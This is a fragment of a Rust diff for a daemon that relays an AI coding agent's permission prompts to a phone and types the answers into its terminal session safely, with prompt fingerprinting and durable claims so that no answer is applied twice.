+        for request_id in &stale {
+            self.resolve_without_phone(
+                request_id,
+                session,
+                AnswerDecision::Deny,
+                ResolvedBy::Superseded,
+                "a newer prompt replaced this one before it was answered; nothing was typed",
+                true,
+            )
+            .await;
+        }
+        stale.len()
+    }
+
+    /// Persist the card so a restart still knows the agent is waiting.
+    ///
+    /// Best-effort by design: failing to write the projection must not stop the
+    /// card reaching the phone, because the durable *fact* is already in the
+    /// event log and the projection is only there to save rebuilding it.
+    async fn persist_pending(
+        &self,
+        session: &SessionKey,
+        card: &ApprovalCard,
+        generation: u64,
+        created_ms: i64,
+    ) {
+        let Ok(encoded) = serde_json::to_string(card) else {
+            crate::log_error!("could not encode the card for {}", card.request_id);
+            return;
+        };
+        if let Err(err) = self
+            .db
+            .upsert_pending_approval(PendingApprovalRow {
+                session_uid: session.uid.clone(),
+                session_id: session.name.clone(),
+                request_id: card.request_id.clone(),
+                card: encoded,
+                generation,
+                created_ms,
+            })
+            .await
+        {
+            crate::log_error!(
+                "could not persist the pending card for {}: {err:#}",
+                card.request_id
+            );
+        }
+    }
+
+    /// Watch for the prompt this card was raised for, and record what it looks
+    /// like.
+    ///
+    /// Off the hook's critical path on purpose: the hook has already returned,
+    /// and making Claude wait ~600ms for us to look at the screen would delay
+    /// the very prompt we are trying to photograph.
+    fn spawn_prompt_binding(
+        self: &Arc<Self>,
+        session: SessionKey,
+        request_id: String,
+        generation: u64,
+    ) {
+        let daemon = Arc::clone(self);
+        tokio::spawn(async move {
+            for _ in 0..PROMPT_SETTLE_ATTEMPTS {
+                tokio::time::sleep(PROMPT_SETTLE_INTERVAL).await;
+                // Gone already — answered at the keyboard, or superseded.
+                let still_open = {
+                    let inner = daemon.inner.lock().await;
+                    inner
+                        .pending
+                        .get(&(session.uid.clone(), request_id.clone()))
+                        .is_some_and(|entry| entry.prompt.is_none())
+                };
+                if !still_open {
+                    return;
+                }
+                let Ok(pane) = daemon.capture_visible(&session.uid).await else {
+                    continue;
+                };
+                if daemon
+                    .bind_prompt_identity(&session, &request_id, generation, &pane)
+                    .await
+                {
+                    return;
+                }
+            }
+            crate::log_debug!(
+                "no permission prompt became visible for {request_id} in {}; the card stays \
+                 answerable only at the keyboard",
+                session.name
+            );
+        });
+    }
+
+    /// Fingerprint the prompt on `pane` and bind it to this card. Returns true
+    /// when identity was established.
+    async fn bind_prompt_identity(
+        &self,
+        session: &SessionKey,
+        request_id: &str,
+        generation: u64,
+        pane: &str,
+    ) -> bool {
+        let presence = self.with_needle_overrides(PromptPresence::PermissionPrompt);
+        let Some(needle) = presence.find_match(pane, None) else {
+            return false;
+        };
+        let Some(fingerprint) = protocol::ipc::prompt_fingerprint(pane, &needle) else {
+            return false;
+        };
+
+        let mut inner = self.inner.lock().await;
+        let id: ApprovalId = (session.uid.clone(), request_id.to_string());
+        let Some(entry) = inner.pending.get_mut(&id) else {
+            return false;
+        };
+        // A prompt that appeared after a *newer* request is not this card's.
+        if entry.generation != generation || entry.prompt.is_some() {
+            return false;
+        }
+        entry.prompt = Some(fingerprint);
+        entry.card.identity_bound = true;
+        let card = entry.card.clone();
+        let created_ms = entry.created_ms;
+        drop(inner);
+
+        // Re-persisted so a restart recovers a card that says what it is.
+        self.persist_pending(session, &card, generation, created_ms)
+            .await;
+
+        // Announced as its own fact. The `approval_request` event was written
+        // before the prompt existed, so its `identity_bound: false` was true
+        // then and is not an answer to "can this be answered from the phone
+        // now". An unknown kind round-trips through an older client untouched,
+        // which is what makes saying it additive.
+        let bound = PendingEvent::new(
+            session,
+            EventKind::Other("approval_prompt_bound".into()),
+            serde_json::json!({
+                "request_id": request_id,
+                "generation": generation,
+                "identity_bound": true,
+            }),
+            Source::Daemon,
+        )
+        .with_source_event_id(format!("bound:{request_id}"));
+        if let Err(err) = self.ingest(bound).await {
+            crate::log_error!("could not record the prompt binding for {request_id}: {err:#}");
+        }
+        crate::log_debug!(
+            "bound {request_id} to the prompt on screen in {}",
+            session.name
+        );
+        true
+    }
+
+    async fn notification_event(
+        &self,
+        session: &SessionKey,
+        raw: &serde_json::Value,
+        input: &HookInput,
+    ) -> PendingEvent {
+        let mut payload = raw.clone();
+        // Snapshot the pane exactly when Claude says a prompt is up, so the
+        // phone can render the real options. A snapshot, never a parse.
+        if input.notification_type.as_deref() == Some("permission_prompt") {
+            if let Ok(SupervisorResult::Snapshot { text }) = self
+                .supervisor_request(
+                    &session.uid,
+                    SupervisorRequest::Capture {
+                        lines: 60,
+                        // Scrollback kept: this snapshot is for the phone to
+                        // *render*, and context is what makes it readable.
+                        // Nothing decides anything from it.
+                        visible_only: false,
+                    },
+                )
+                .await
+            {
+                if let Some(map) = payload.as_object_mut() {
+                    map.insert("_codeconnect_pane".into(), serde_json::Value::String(text));
+                }
+            }
+        }
+        PendingEvent::new(session, EventKind::Notification, payload, Source::Hook)
+    }
+
+    async fn maybe_push(&self, session: &SessionKey, input: &HookInput) {
+        let kind = input.notification_type.as_deref().unwrap_or("");
+        if !matches!(
+            kind,
+            "permission_prompt" | "agent_needs_input" | "agent_completed" | "idle_prompt"
+        ) {
+            return;
+        }
+        self.push.send(&PushHint {
+            session_id: session.name.clone(),
+            title: session.name.clone(),
+            body: input
+                .message
+                .clone()
+                .unwrap_or_else(|| kind.replace('_', " ")),
+            blocked_sessions: self.blocked_session_count().await,
+        });
+    }
+
+    async fn blocked_session_count(&self) -> usize {
+        let inner = self.inner.lock().await;
+        inner
+            .pending
+            .values()
+            .map(|p| p.session.uid.as_str())
+            .collect::<std::collections::HashSet<_>>()
+            .len()
+    }
+
+    /// Work out which run this hook belongs to, adopting it if it is new, and
+    /// learn its transcript path / Claude uuid along the way.
+    ///
+    /// Three cases, in decreasing order of confidence:
+    ///
+    /// 1. **The hook carries a uid.** `cc claude` minted it at spawn and passed
+    ///    it into the generated settings, so this is exact.
+    /// 2. **No uid, but a live run answers to the name.** A session started
+    ///    before this daemon was upgraded posts from a settings file that
+    ///    predates the flag; continuing its existing identity is what keeps the
+    ///    in-place upgrade seamless.
+    /// 3. **No uid and no live run.** Either a session CodeConnect never
+    ///    launched (`claude:<uuid>`) or a name whose previous holder has exited.
+    ///    A fresh identity is minted — an exited run must never gain new events,
+    ///    which is the whole point.
+    async fn ensure_session(
+        &self,
+        session_id: &str,
+        session_uid: Option<&str>,
+        input: &HookInput,
+    ) -> Result<SessionKey> {
+        let now = protocol::time::now_rfc3339();
+        let existing = self.lookup_run(session_id, session_uid).await?;
+        let uid = match (&existing, session_uid) {
+            (Some(row), _) => row.session_uid.clone(),
+            (None, Some(uid)) if protocol::uid::is_well_formed(uid) => uid.to_string(),
+            (None, _) => {
+                let uid = protocol::uid::new()?;
+                crate::log_info!("adopting session {session_id} as {uid}");
+                uid
+            }
+        };
+
+        let row = SessionRow {
+            session_uid: uid.clone(),
+            session_id: session_id.to_string(),
+            tmux_session: existing
+                .as_ref()
+                .map(|r| r.tmux_session.clone())
+                .unwrap_or_else(|| session_id.to_string()),
+            tmux_socket: existing
+                .as_ref()
+                .map(|r| r.tmux_socket.clone())
+                .unwrap_or_else(|| protocol::TMUX_SOCKET_NAME.to_string()),
+            cwd: input
+                .cwd
+                .clone()
+                .or_else(|| existing.as_ref().map(|r| r.cwd.clone()))
+                .unwrap_or_default(),
+            claude_session_id: input.session_id.clone(),
+            transcript_path: input.transcript_path.clone(),
+            lifecycle: Lifecycle::Live,
+            created_at: existing
+                .as_ref()
+                .map(|r| r.created_at.clone())
+                .unwrap_or_else(|| now.clone()),
+            updated_at: now,
+        };
+        self.db.upsert_session(row.clone()).await?;
+
+        if let Some(path) = &input.transcript_path {
+            let already = existing
+                .as_ref()
+                .and_then(|r| r.transcript_path.clone())
+                .is_some_and(|known| &known == path);
+            if !already {
+                let _ = self.transcript_tx.send((uid.clone(), path.clone()));
+            }
+        }
+        Ok(SessionKey::new(uid, session_id))
+    }
+
+    /// The row a hook or a registration should continue, if there is one.
+    ///
+    /// An **exited** run is deliberately not continued when only a name is
+    /// offered: `cc-1` having ended and `cc-1` having restarted look identical
+    /// from the outside, and appending to the dead one is precisely the failure
+    /// this prevents. With a uid in hand the row is taken as named, dead
+    /// or alive — a supervisor reconnecting to report its own exit has to reach
+    /// its own row.
+    async fn lookup_run(
+        &self,
+        session_id: &str,
+        session_uid: Option<&str>,
+    ) -> Result<Option<SessionRow>> {
+        if let Some(uid) = session_uid.filter(|uid| protocol::uid::is_well_formed(uid)) {
+            return self.db.get_session(uid.to_string()).await;
+        }
+        Ok(self
+            .db
+            .find_session(session_id.to_string())
+            .await?
+            .filter(|row| row.lifecycle != Lifecycle::Exited))
+    }
+
+    /// Resolve whatever a client named — a uid or a tmux name — to a real run.
+    ///
+    /// A uid is exact. A **name** is not an identity, so it is resolved to the
+    /// run a human means by it, in this order:
+    ///
+    /// 1. the one with a supervisor attached right now — the only positive
+    ///    evidence of which run currently owns the name;
+    /// 2. failing that, the store's policy — the newest run under that name.
+    ///
+    /// Two simple rules rather than one compound one, and neither of them reads
+    /// `lifecycle`: a session that ended while the daemon was down was never
+    /// observed exiting, so `lifecycle` says `Live` forever and ranking on it
+    /// would put that ghost above the run that is genuinely there.
+    pub async fn resolve(&self, reference: &str) -> Result<SessionRow> {
+        if protocol::uid::is_well_formed(reference) {
+            if let Some(row) = self.db.get_session(reference.to_string()).await? {
+                return Ok(row);
+            }
+        }
+        let attached: Option<SessionRow> = {
+            let inner = self.inner.lock().await;
+            self.store
+                .list_sessions()?
+                .into_iter()
+                .filter(|row| {
+                    row.session_id == reference && inner.supervisors.contains_key(&row.session_uid)
+                })
+                .max_by(|a, b| a.session_uid.cmp(&b.session_uid))
+        };
+        if let Some(row) = attached {
+            return Ok(row);
+        }
+        self.store
+            .find_session(reference)?
+            .ok_or_else(|| anyhow!("unknown session {reference}"))
+    }
+
+    // --------------------------------------------------------------- answers
+
+    /// Which run an answer is for.
+    ///
+    /// A `session_uid` settles it outright. Anything else — a bare tmux name, or
+    /// nothing at all from a protocol-minor-1 client — is matched against the
+    /// live approvals; if none matches (the card was answered and the entry is
+    /// gone) the ledger is consulted, so a retried tap still gets its original
+    /// outcome back.
+    ///
+    /// Two live approvals sharing a request id is the one case that cannot be
+    /// worked out, and it is refused with an instruction rather than resolved by
+    /// coin flip. That refusal covers the name-scoped case as well as the
+    /// unscoped one: "the run called `cc-1`" is not an answer to "which of these
+    /// two cards did the human tap", and typing into the wrong agent's TTY is
+    /// not a mistake that can be taken back.
+    async fn approval_target(
+        &self,
+        request_id: &str,
+        session_ref: Option<&str>,
+    ) -> std::result::Result<String, String> {
+        // A **uid** is an identity: it names one run and there is nothing to
+        // disambiguate.
+        if let Some(uid) = session_ref.filter(|value| protocol::uid::is_well_formed(value)) {
+            return match self.db.get_session(uid.to_string()).await {
+                Ok(Some(row)) => Ok(row.session_uid),
+                Ok(None) => Err(format!("unknown session {uid}")),
+                Err(err) => Err(format!("session lookup failed: {err}")),
+            };
+        }
+
+        // Everything else is a *name*, and a name is not an identity — whether
+        // it arrived in `session_id` or not at all. So both cases get the same
+        // ambiguity check: if this request id is open in more than one run, the
+        // right answer cannot be worked out and must not be guessed at.
+        //
+        // The collision is not hypothetical. When a `PermissionRequest` has no
+        // PreToolUse to correlate against, the request id falls back to
+        // `pr-<prompt_id>-<hash>` and the hash covers only the tool and its
+        // input — so two runs executing the same ordinary command produce the
+        // same request id *and* the same payload hash, which means the staleness
+        // guard downstream would not catch the mix-up either.
+        let matches: Vec<String> = {
+            let inner = self.inner.lock().await;
+            inner
+                .pending
+                .iter()
+                // `Option::is_none_or` would read better but was stabilised
+                // after the toolchain this workspace declares support for.
+                .filter(|((_, id), entry)| {
+                    id == request_id
+                        && match session_ref {
+                            Some(name) => entry.session.name == name,
+                            None => true,
+                        }
+                })
+                .map(|((uid, _), _)| uid.clone())
+                .collect()
+        };
+        match matches.len() {
+            1 => return Ok(matches.into_iter().next().expect("length checked")),
+            0 => {}
+            _ => {
+                return Err(
+                    "this request id is open in more than one run of that name; \
+                     answer with the session_uid the card came from"
+                        .into(),
+                )
+            }
+        }
+
+        // No live approval matches. Either the card was already answered — in
+        // which case the ledger replays its outcome — or the name is unknown.
+        if let Some(name) = session_ref {
+            if self
+                .db
+                .find_session(name.to_string())
+                .await
+                .ok()
+                .flatten()
+                .is_none()
+            {
+                return Err(format!("unknown session {name}"));
+            }
+        }
+        match self.db.find_answer_by_request(request_id.to_string()).await {
+            Ok(Some((uid, _, _))) => Ok(uid),
+            Ok(None) => Err("unknown or already-resolved request".into()),
+            Err(err) => Err(format!("ledger read failed: {err}")),
+        }
+    }
+
+    /// Apply a phone answer. Idempotent by `(session, request_id)`, guarded by
+    /// `payload_hash`.
+    pub async fn answer(
+        &self,
+        request_id: &str,
+        payload_hash: &str,
+        decision: AnswerDecision,
+        session_ref: Option<&str>,
+    ) -> AnswerResult {
+        let session_uid = match self.approval_target(request_id, session_ref).await {
+            Ok(uid) => uid,
+            Err(reason) => return AnswerResult::Rejected { reason },
+        };
+        let id: ApprovalId = (session_uid.clone(), request_id.to_string());
+
+        // 0. Serialise on this one approval. Two taps arriving together used to
+        //    make the second one a *rejection* ("already being applied"), which
+        //    contradicts the rule that a duplicate returns the original
+        //    outcome — and made a double-tap on a flaky link look like a
+        //    failure. Waiting for the winner costs the injection's latency and
+        //    turns the racer into a well-formed duplicate.
+        let gate = {
+            let mut inner = self.inner.lock().await;
+            // Bounded: entries are dropped once nothing else holds them, so a
+            // long-lived daemon does not accumulate one lock per approval ever
+            // shown.
+            inner
+                .answer_locks
+                .retain(|_, lock| Arc::strong_count(lock) > 1);
+            Arc::clone(inner.answer_locks.entry(id.clone()).or_default())
+        };
+        let _serialised = gate.lock().await;
+
+        // 1. Durable ledger wins over everything: an already-answered request is
+        //    a no-op that replays the original outcome.
+        match self
+            .db
+            .get_answer(session_uid.clone(), request_id.to_string())
+            .await
+        {
+            Ok(Some((stored_hash, outcome))) => {
+                // A superseded card was never *answered* — nothing was typed for
+                // it — so replaying it as a duplicate would tell the phone its
+                // tap had been applied. It is refused, and the refusal says what
+                // to do instead.
+                if outcome.resolved_by == ResolvedBy::Superseded {
+                    return AnswerResult::Rejected {
+                        reason: "this card was superseded by a newer prompt in the same run; \
+                                 nothing was typed for it. Answer the current card."
+                            .into(),
+                    };
+                }
+                return AnswerResult::Duplicate {
+                    outcome,
+                    stale_payload_hash: stored_hash != payload_hash,
+                };
+            }
+            Ok(None) => {}
+            Err(err) => {
+                crate::log_error!("ledger read failed: {err:#}");
+                return AnswerResult::Rejected {
+                    reason: "ledger unavailable".into(),
+                };
+            }
+        }
+
+        // 2. A claim with no terminal outcome means a previous attempt was cut
+        //    off between typing and recording. Startup recovery normally turns
+        //    those into terminal indeterminate outcomes; reaching one here means
+        //    that did not happen, and the rule is the same either way — never
+        //    type again on a question we cannot answer.
+        match self
+            .db
+            .answer_claim(session_uid.clone(), request_id.to_string())
+            .await
+        {
+            Ok(Some(claim)) => {
+                crate::log_warn!(
+                    "{request_id} carries an unsettled claim from {}; refusing to type again",
+                    claim.started_at
+                );
+                self.settle_indeterminate(&claim).await;
+                self.inner.lock().await.pending.remove(&id);
+                return match self
+                    .db
+                    .get_answer(session_uid.clone(), request_id.to_string())
+                    .await
+                {
+                    Ok(Some((stored_hash, outcome))) => AnswerResult::Duplicate {
+                        outcome,
+                        stale_payload_hash: stored_hash != payload_hash,
+                    },
+                    _ => AnswerResult::Rejected {
+                        reason: "a previous attempt to apply this answer was interrupted and \
+                                 whether it reached the agent is unknown; it will not be typed \
+                                 again. Answer at the Mac."
+                            .into(),
+                    },
+                };
+            }
+            Ok(None) => {}
+            Err(err) => {
+                crate::log_error!("claim read failed: {err:#}");
+                return AnswerResult::Rejected {
+                    reason: "ledger unavailable".into(),
+                };
+            }
+        }
+
+        // 3. Claim in memory so a local resolution racing us backs off, and
+        //    check that this card is still the prompt on screen.
+        let (session, card, responder, expect) = {
+            let mut inner = self.inner.lock().await;
+            let current = inner
+                .prompt_generation
+                .get(&session_uid)
+                .copied()
+                .unwrap_or(0);
+            let Some(entry) = inner.pending.get_mut(&id) else {
+                return AnswerResult::Rejected {
+                    reason: "unknown or already-resolved request".into(),
+                };
+            };
+            if entry.card.payload_hash != payload_hash {
+                return AnswerResult::Rejected {
+                    reason: "stale payload_hash: the card you answered is out of date".into(),
+                };
+            }
+            // Belt and braces against the superseding sweep above: an entry that
+            // was mid-injection when a newer prompt arrived is deliberately left
+            // in place, and must still not be answerable afterwards.
+            if entry.generation < current {
+                return AnswerResult::Rejected {
+                    reason: format!(
+                        "this card is for prompt {} and the run is now on prompt {current}; \
+                         nothing was typed. Answer the current card.",
+                        entry.generation
+                    ),
+                };
+            }
+            entry.claimed = true;
+            (
+                entry.session.clone(),
+                entry.card.clone(),
+                entry.responder.take(),
+                entry.prompt.clone(),
+            )
+        };
+
+        // 4. Claim it durably, before a single key is sent. Without this a
+        //    daemon killed mid-injection comes back with no record that anything
+        //    was ever attempted, and the next tap types the answer a second time.
+        let claim = AnswerClaim {
+            session_uid: session.uid.clone(),
+            session_id: session.name.clone(),
+            request_id: request_id.to_string(),
+            payload_hash: card.payload_hash.clone(),
+            decision: serde_json::to_string(&decision).unwrap_or_default(),
+            started_at: protocol::time::now_rfc3339(),
+        };
+        if let Err(err) = self.db.claim_answer(claim.clone()).await {
+            crate::log_error!("could not claim {request_id} durably: {err:#}");
+            let mut inner = self.inner.lock().await;
+            if let Some(entry) = inner.pending.get_mut(&id) {
+                entry.claimed = false;
+            }
+            return AnswerResult::Rejected {
+                reason: "could not record that this answer is being applied; nothing was typed"
+                    .into(),
+            };
+        }
+
+        // 5. Apply.
+        let (applied_via, detail) = match self
+            .apply_decision(&session, &decision, responder, expect)
+            .await
+        {
+            Actuation::Applied { via, detail } => (via, detail),
+            // The supervisor said no *before* injecting, so we know nothing was
+            // typed. The claim is released and the card is answerable again.
+            Actuation::Refused(reason) => {
+                let _ = self
+                    .db
+                    .release_answer_claim(session.uid.clone(), request_id.to_string())
+                    .await;
+                let mut inner = self.inner.lock().await;
+                if let Some(entry) = inner.pending.get_mut(&id) {
+                    entry.claimed = false;
+                }
+                return AnswerResult::Rejected { reason };
+            }
+            // A timeout, a dropped request, a supervisor that went away
+            // mid-flight: it may have typed and it may not, and there is no
+            // later evidence that can settle it. Releasing the claim here would
+            // let the next tap type a second time into a live TTY — so the
+            // claim becomes a terminal *indeterminate* outcome instead, exactly
+            // as a restart would have recorded it.
+            Actuation::Unknown(reason) => {
+                crate::log_error!(
+                    "{request_id}: the supervisor never confirmed the injection ({reason}); \
+                     recording it as indeterminate rather than allowing a retry"
+                );
+                self.settle_indeterminate(&claim).await;
+                self.inner.lock().await.pending.remove(&id);
+                return match self
+                    .db
+                    .get_answer(session.uid.clone(), request_id.to_string())
+                    .await
+                {
+                    Ok(Some((stored_hash, outcome))) => AnswerResult::Duplicate {
+                        outcome,
+                        stale_payload_hash: stored_hash != payload_hash,
+                    },
+                    _ => AnswerResult::Rejected {
+                        reason: format!(
+                            "the supervisor never confirmed this injection ({reason}); whether \
+                             it reached the agent is unknown and it will not be typed again. \
+                             Check the Mac."
+                        ),
+                    },
+                };
+            }
+        };
+
+        // 6. Record the terminal outcome, which also clears the claim.
+        let mut outcome = AnswerOutcome {
+            request_id: request_id.to_string(),
+            session_id: session.name.clone(),
+            decision: decision.clone(),
+            resolved_by: ResolvedBy::Phone,
+            applied_via,
+            resolved_at: protocol::time::now_rfc3339(),
+            detail,
+            // Observed: we typed it, and the injection was confirmed.
+            inferred: false,
+            indeterminate: false,
+        };
+        let result =
+            match self
+                .store
+                .record_answer(&session.uid, request_id, &card.payload_hash, &outcome)
+            {
+                Ok(LedgerWrite::Recorded) => AnswerResult::Applied {
+                    outcome: outcome.clone(),
+                },
+                Ok(LedgerWrite::Existing {
+                    outcome: original,
+                    payload_hash: stored_hash,
+                }) => AnswerResult::Duplicate {
+                    outcome: original,
+                    stale_payload_hash: stored_hash != payload_hash,
+                },
+                Err(err) => {
+                    // The decision has already been typed into the TTY, and the
+                    // supervisor confirmed it, so `Applied` is what happened.
+                    // What is *not* true is that it was recorded — and the claim
+                    // row surviving is what stops a retry typing it again.
+                    crate::log_error!("ledger write failed after injection: {err:#}");
+                    outcome.detail = Some(format!(
+                        "{} (applied, but the durable record could not be written; a retry will \
+                         be refused rather than re-applied)",
+                        outcome.detail.as_deref().unwrap_or("typed into the prompt")
+                    ));
+                    AnswerResult::Applied {
+                        outcome: outcome.clone(),
+                    }
+                }
+            };
+
+        // Dropped unconditionally, including on that ledger failure.
+        //
+        // With no ledger row, a later tap has nothing to be told it duplicates —
+        // but the durable claim is still there, so it is told "interrupted,
+        // outcome unknown" rather than being applied a second time.
+        self.inner.lock().await.pending.remove(&id);
+        let _ = self
+            .db
+            .delete_pending_approval(session.uid.clone(), request_id.to_string())
+            .await;
+        let resolved = PendingEvent::new(
+            &session,
+            EventKind::ApprovalResolved,
+            serde_json::to_value(&outcome).unwrap_or(serde_json::Value::Null),
+            Source::Daemon,
+        )
+        .with_source_event_id(format!("resolved:{request_id}"));
+        if let Err(err) = self.ingest(resolved).await {
+            crate::log_error!("failed to record resolution: {err:#}");
+        }
+        result
+    }
+
+    /// Apply the decision, and say which of three things happened.
+    ///
+    /// The three are not stylistic. "It was refused" and "we never found out"
+    /// are the same `Err` to a caller that only has success and failure, and
+    /// the caller has to tell them apart: a refusal means nothing was typed and
+    /// the card may be answered again, while an unanswered request may have
+    /// typed and must never be retried.
+    ///
+    /// `expect` is the prompt this card was bound to. Anything that answers the
+    /// *prompt* (yes / escape / an option index) requires it, because those
+    /// keystrokes are only meaningful against one specific prompt and are
+    /// actively dangerous against a different one. A free-text takeover does
+    /// not: it is not an answer to a prompt at all, and its interlock is the
+    /// composer being ready to receive it.
+    async fn apply_decision(
+        &self,
+        session: &SessionKey,
+        decision: &AnswerDecision,
+        responder: Option<oneshot::Sender<HookDecision>>,
+        expect: Option<PromptFingerprint>,
+    ) -> Actuation {
+        // Structured return, when a hook is actually holding and the decision is
+        // expressible as one. Cheaper and racier-proof than typing.
+        if let Some(responder) = responder {
+            let hook_decision = match decision {
+                AnswerDecision::Allow => Some(HookDecision {
+                    decision: Decision::Allow,
+                    reason: Some("Approved from iPhone".into()),
+                }),
+                AnswerDecision::Deny => Some(HookDecision {
+                    decision: Decision::Deny,
+                    reason: Some("Denied from iPhone".into()),
+                }),
+                _ => None,
+            };
+            if let Some(hook_decision) = hook_decision {
+                if responder.send(hook_decision).is_ok() {
+                    return Actuation::Applied {
+                        via: AnswerPath::HookReturn,
+                        detail: Some("hook return".into()),
+                    };
+                }
+            }
+            // The hook already gave up; fall through to typing.
+        }
+
+        let (text, submit) = match decision {
+            // Option 1 is the affirmative in Claude's permission prompt.
+            AnswerDecision::Allow => ("1".to_string(), true),
+            // Escape is the prompt's own cancel affordance ("Esc to cancel").
+            // Option indices for "No" vary with the suggestions Claude offers,
+            // so guessing one would risk selecting "always allow".
+            AnswerDecision::Deny => ("\u{1b}".to_string(), false),
+            AnswerDecision::Option { index } => (index.to_string(), true),
+            AnswerDecision::Text { text } => (text.clone(), true),
+        };
+
+        let answers_the_prompt = !matches!(decision, AnswerDecision::Text { .. });
+        let require = self.with_needle_overrides(if answers_the_prompt {
+            PromptPresence::PermissionPrompt
+        } else {
+            PromptPresence::InputBox
+        });
+
+        let expect = if answers_the_prompt {
+            // The whole rule in one place: no identity, no keystroke.
+            // "1" typed at a prompt we cannot recognise is a yes to a question
+            // nobody read, and the person at the Mac can see the screen.
+            let Some(expect) = expect else {
+                return Actuation::Refused(
+                    "the prompt this card was created for could not be identified on screen, \
+                     so nothing was typed. Answer at the Mac."
+                        .into(),
+                );
+            };
+            match self.supervisor_minor(&session.uid).await {
+                // Too old to honour the fingerprint: it would accept the field
+                // and drop it, so the injection would look checked and be
+                // unchecked.
+                Some(minor) if minor < SUPERVISOR_MINOR_PROMPT_IDENTITY => {
+                    return Actuation::Refused(
+                        "this session's supervisor predates prompt identity (restart the \
+                         session to pick up the current build); nothing was typed"
+                            .into(),
+                    );
+                }
+                Some(_) => {}
+                // No supervisor at all. Deliberately *not* reported here: the
+                // request path says "no supervisor attached", which is the
+                // actual reason, and answering with a version complaint would
+                // send somebody looking for the wrong problem.
+                None => {}
+            }
+            Some(expect)
+        } else {
+            None
+        };
+
+        match self
+            .supervisor_request(
+                &session.uid,
+                SupervisorRequest::SendText {
+                    text,
+                    require,
+                    submit,
+                    expect,
+                },
+            )
+            .await
+        {
+            Ok(SupervisorResult::Sent { matched }) => Actuation::Applied {
+                via: AnswerPath::SendKeys,
+                detail: Some(matched),
+            },
+            // A refusal is a *positive* statement that nothing was typed: the
+            // supervisor checks before it injects and never after.
+            Ok(SupervisorResult::Refused { reason }) => {
+                Actuation::Refused(format!("refused: {reason}"))
+            }
+            Ok(other) => Actuation::Unknown(format!("unexpected supervisor result: {other:?}")),
+            // Never handed to a supervisor at all, so it cannot have typed.
+            Err(SupervisorFailure::NotSent(reason)) => {
+                Actuation::Refused(format!("{reason}; nothing was typed"))
+            }
+            // Sent and never answered. It may have typed before it stopped
+            // answering, and nothing that happens later can settle that — so
+            // this is never treated as "nothing happened", which is what would
+            // let the next tap type again.
+            Err(SupervisorFailure::Unanswered(reason)) => Actuation::Unknown(reason),
+        }
+    }
+
+    /// What the supervisor for this run can honour, or `None` if there is none.
+    ///
+    /// A supervisor from before minor 3 accepts the fingerprint field and
+    /// ignores it — serde drops what it does not know — so sending an approval
+    /// to one would look like a checked injection and be an unchecked one. That
+    /// is a different problem from having no supervisor at all, and the two get
+    /// different answers.
+    async fn supervisor_minor(&self, session_uid: &str) -> Option<u32> {
+        self.inner
+            .lock()
+            .await
+            .supervisors
+            .get(session_uid)
+            .map(|handle| handle.protocol_minor)
+    }
+
+    /// Resolve configured needle overrides into the request itself, so the
+    /// supervisor stays dumb and the operator can fix a broken presence check
+    /// (Claude's TUI copy is the most churn-prone thing we depend on) by
+    /// editing one config file instead of shipping a release.
+    fn with_needle_overrides(&self, presence: PromptPresence) -> PromptPresence {
+        let overrides = match presence {
+            PromptPresence::InputBox => self.config.input_box_needles(),
+            PromptPresence::PermissionPrompt => self.config.permission_prompt_needles(),
+            PromptPresence::AnyOf { .. } => return presence,
+        };
+        match overrides {
+            Some(needles) => PromptPresence::AnyOf {
+                needles: needles.to_vec(),
+            },
+            None => presence,
+        }
+    }
+
+    /// Free-text takeover from the phone. `session_ref` is a uid or a name.
+    ///
+    /// A mutation with an identity, so a phone on a flaky link can retry the
+    /// same takeover without typing it twice. Three things changed in minor 3
+    /// and all three are load-bearing:
+    ///
+    /// * The **server** picks the interlock. Letting the caller nominate the
+    ///   needle that authorises its own keystrokes (`PromptPresence::AnyOf`)
+    ///   made the safety check something the client could write for itself,
+    ///   which is not a safety check.
+    /// * The body is **bounded**. A megabyte typed into a TTY is not a takeover.
+    /// * The mutation is **claimed durably before anything is typed**, so a
+    ///   retry after a crash is told "unknown" rather than typing again.
+    pub async fn send_text(
+        &self,
+        session_ref: &str,
+        text: String,
+        request_id: Option<&str>,
+        payload_hash: Option<&str>,
+        submit: bool,
+    ) -> SendTextResult {
+        if text.len() > protocol::ws::MAX_SEND_TEXT_BYTES {
+            return SendTextResult::Refused {
+                reason: format!(
+                    "text is {} bytes; the ceiling is {}",
+                    text.len(),
+                    protocol::ws::MAX_SEND_TEXT_BYTES
+                ),
+            };
+        }
+        let session_uid = match self.resolve(session_ref).await {
+            Ok(row) => row.session_uid,
+            Err(err) => {
+                return SendTextResult::Refused {
+                    reason: format!("{err}"),
+                }
+            }
+        };
+
+        // The identity, if the client offered one. A `request_id` without a
+        // hash is refused rather than trusted: the id alone says "this is a
+        // retry" without saying a retry *of what*, and the ledger would then
+        // happily suppress a completely different takeover.
+        let identity = match (request_id, payload_hash) {
+            (Some(request_id), Some(given)) => {
+                let expected = protocol::hash::send_text_hash(session_ref, &text, submit);
+                if !constant_time_eq(given.as_bytes(), expected.as_bytes()) {
+                    return SendTextResult::Refused {
+                        reason: "payload_hash does not match the text, session and submit flag \
+                                 in this request"
+                            .into(),
+                    };
+                }
+                Some((request_id.to_string(), expected))
+            }
+            (Some(_), None) => {
+                return SendTextResult::Refused {
+                    reason: "request_id without payload_hash: an idempotent mutation has to say \
+                             what it is a retry of"
+                        .into(),
+                }
+            }
+            (None, _) => None,
+        };
+
+        if let Some((request_id, hash)) = &identity {
+            match self
+                .db
+                .claim_text_mutation(
+                    session_uid.clone(),
+                    request_id.to_string(),
+                    hash.to_string(),
+                    protocol::time::now_rfc3339(),
+                )
+                .await
+            {
+                Ok(TextClaim::Claimed) => {}
+                Ok(TextClaim::Applied {
+                    matched,
+                    settled_at,
+                }) => {
+                    return SendTextResult::Duplicate {
+                        matched,
+                        applied_at: settled_at,
+                    }
+                }
+                Ok(TextClaim::Indeterminate { started_at }) => {
+                    return SendTextResult::Indeterminate {
+                        reason: format!(
+                            "a previous attempt at this mutation (claimed {started_at}) was \
+                             interrupted; whether it reached the agent was never observed, and \
+                             it will not be typed again"
+                        ),
+                    }
+                }
+                Ok(TextClaim::Conflict) => {
+                    return SendTextResult::Refused {
+                        reason: "this request_id was already used for different text in this \
+                                 session; use a new one"
+                            .into(),
+                    }
+                }
+                Err(err) => {
+                    crate::log_error!("could not claim send_text {request_id}: {err:#}");
+                    return SendTextResult::Refused {
+                        reason: "could not record that this mutation is being applied; nothing \
+                                 was typed"
+                            .into(),
+                    };
+                }
+            }
+        } else {
+            crate::log_debug!(
+                "send_text for {session_uid} carries no request_id; a retry of it would type twice"
+            );
+        }
+
+        // Chosen here, never by the caller. Config overrides still apply — those
+        // come from the operator's own file, not from the wire.
